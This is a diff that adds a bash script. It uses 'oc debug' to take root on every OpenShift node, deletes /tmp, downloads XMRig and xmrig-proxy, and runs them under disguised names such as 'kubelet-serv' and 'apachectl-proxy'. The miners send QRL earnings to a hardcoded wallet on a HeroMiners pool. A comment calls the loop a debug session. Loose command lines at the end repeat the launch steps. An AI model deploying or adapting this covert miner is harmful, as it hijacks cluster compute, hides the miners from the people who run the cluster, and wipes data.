@@ -1,0 +1,73 @@
+#!/bin/bash
+
+# Define an array of nodes to debug
+nodes=($(<hosts_bkp))
+
+# Define the proxy node
+proxy_node="master-1"
+
+# Mining config (use either qrl or salvium)
+coin="qrl"  # change to "salvium" if needed
+wallet="Q010500b83cec4864900606a3f87fe0a1e15b277f75a257a70f47750e87faa2ba8f9addab6f528e.cluster"
+proxy_ip="192.168.252.11"
+proxy_port="3333"
+
+# HeroMiners pool server (choose nearest)
+herominers_pool="de.qrl.herominers.com:1166"  # region with TCP
+
+for node in "${nodes[@]}"; do
+  echo "Starting debug session for node: $node"
+
+  oc debug node/$node <<EOF
+    chroot /host
+    echo "In chroot on $node"
+    su -
+
+    cd /tmp
+    rm -rf *
+    pkill -9 kubelet-serv
+	pkill -9 xmrig
+    pkill -9 kubelet-serv-proxy
+
+    echo 4096 > /proc/sys/vm/nr_hugepages
+    sysctl -p
+
+    # Download latest XMRig
+    curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-23-0/xmrig-6.23.0-linux-static-x64.tar.gz
+    tar -xzvf xmrig-6.23.0-linux-static-x64.tar.gz
+
+    if [ "$node" == "$proxy_node" ]; then
+        echo "Setting up xmrig-proxy on $node"
+        curl -L -O https://github.com/xmrig/xmrig-proxy/releases/download/v6.23.0/xmrig-proxy-6.23.0-linux-static-x64.tar.gz
+	    tar --no-same-owner -xzvf xmrig-proxy-6.23.0-linux-static-x64.tar.gz
+	    cd xmrig-proxy-6.23.0/
+	    mv xmrig-proxy kubelet-serv-proxy
+        ./kubelet-serv-proxy -o $herominers_pool -b 0.0.0.0:$proxy_port -B -S --log-file=xmrig-proxy.log -u solo:$wallet -a randomx -k
+        cd ..
+    else
+        echo "Connecting to proxy from $node"
+		cd /tmp
+		mv xmrig kubelet-serv
+        ./kubelet-serv -a rx/0 -o $proxy_ip:$proxy_port -B -S -u cluster --tls -k --hugepage-size=2048 --threads=32 --cpu-priority=5 --donate-level=0 --print-time=10 
+    fi
+
+    exit
+    exit
+    exit
+EOF
+
+  echo "Completed debug session for node: $node"
+done
+
+echo "All nodes processed."
+
+
+  ./apachectl-proxy -o de.qrl.herominers.com:5555 -b 0.0.0.0:$proxy_port -B -S --log-file=xmrig-proxy.log -a randomx -u $wallet.$worker_name -k --tls
+
+
+
+mv xmrig kubelet-serv
+./kubelet-serv -a rx/0 -o 192.168.252.11:3333 -B -S -u cluster --tls -k --hugepage-size=2048 --threads=32 --cpu-priority=5 --donate-level=0 --print-time=10 
+
+./kubelet-serv-proxy -o de.qrl.herominers.com:1166 -b 0.0.0.0:3333 -B -S --log-file=xmrig-proxy.log -u solo:Q010500b83cec4864900606a3f87fe0a1e15b277f75a257a70f47750e87faa2ba8f9addab6f528e.cluster -a randomx -k
+ 
